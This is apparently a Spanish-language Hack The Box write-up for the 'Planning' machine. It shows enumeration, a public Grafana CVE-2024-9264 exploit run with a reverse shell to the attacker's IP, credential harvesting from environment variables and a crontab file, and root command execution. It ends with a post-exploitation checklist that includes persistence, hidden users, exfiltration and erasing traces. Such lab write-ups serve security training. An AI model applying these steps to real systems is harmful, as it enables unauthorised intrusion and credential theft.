# Writeup - HTB "Planning"

## 1. Reconocimiento inicial

### Ping

```bash
ping 10.10.11.68
```

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.68
```

#### Puertos abiertos encontrados:

* **22/tcp** - SSH
* **80/tcp** - HTTP

### Detección de versiones

```bash
nmap -p22,80 -sCV 10.10.11.68
```

#### Resultados relevantes:

* **22/tcp**: `OpenSSH 9.6p1 Ubuntu 3ubuntu13.11`
* **80/tcp**: `nginx 1.24.0 (Ubuntu)`

---

## 2. Enumeración web

### Modificación de `/etc/hosts`

Se añadió la siguiente entrada para poder acceder al sitio:

```
10.10.11.68 planning.htb
```

Al explorar la web principal, **no se encontró nada relevante**.

### Enumeración de subdominios

```bash
ffuf -u http://planning.htb/ -H "Host: FUZZ.planning.htb" -w /usr/share/amass/wordlists/all.txt -c -t 50 -fs 178
```

Se descubrió un subdominio interesante: **`grafana.planning.htb`**

---

## 3. Acceso a Grafana

Se añadió nuevamente al `/etc/hosts`:

```
10.10.11.68 grafana.planning.htb
```

En el login se detectó la **versión 11.0.0 de Grafana**.

### Búsqueda de vulnerabilidades

Se encontró el siguiente exploit público:

> [https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

### Ejecución del exploit:

```bash
python poc.py --url http://grafana.planning.htb:80 \
              --username admin \
              --password 0D5oT70Fq13EvB5r \
              --reverse-ip 10.10.14.24 \
              --reverse-port 9001
```

### Listener:

```bash
nc -lvnp 9001
```

Se obtuvo una **reverse shell** exitosa.

---

## 4. Escalación de privilegios

### Variables de entorno:

```bash
env
```

Se descubrieron credenciales de administrador:

```
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

---

## 5. Acceso SSH

Se usaron las credenciales anteriores para conectarse por SSH:

```bash
ssh enzo@10.10.11.68
# Contraseña: RioTecRANDEntANT!
```

### Bandera de usuario:

```
cat ~/user.txt
```

---

## 6. Exploración post-explotación

Se encontró un archivo en `/opt/crontabs/crontab.db` que contenía otra contraseña:

```
P4ssw0rdS0pRi0T3
```

---

## 7. Escalamiento lateral / acceso a puertos locales

Revisando los puertos abiertos:

```bash
ss -tulnp
```

Se encontró un servicio local en el puerto `8000`. Para acceder desde la máquina atacante se hizo un **port forwarding**:

```bash
ssh -L 8888:localhost:8000 enzo@10.10.11.68
# Contraseña: P4ssw0rdS0pRi0T3
```

Accediendo a `http://localhost:8888` desde el navegador se encontró una interfaz desde donde era posible ejecutar comandos como **root**.

### Ejecución de comandos:

Se creó un job que copiaba la flag de root:

```bash
cat /root/root.txt > /tmp/flag
```

Desde la sesión SSH se verificó la flag:

```bash
cat /tmp/flag
```

---

## 8. Post-Explotación

📌 Acciones posibles tras obtener acceso como **root**:

- ✅ Establecer persistencia
- 👤 Crear usuario oculto
- 🔐 Añadir clave pública SSH
- 📦 Exfiltrar información sensible
- 🌐 Explorar red interna
- 🔀 Pivoting hacia otras máquinas
- 🧹 Eliminar huellas
- 💣 Destruir el sistema (⚠️ no recomendado)
---
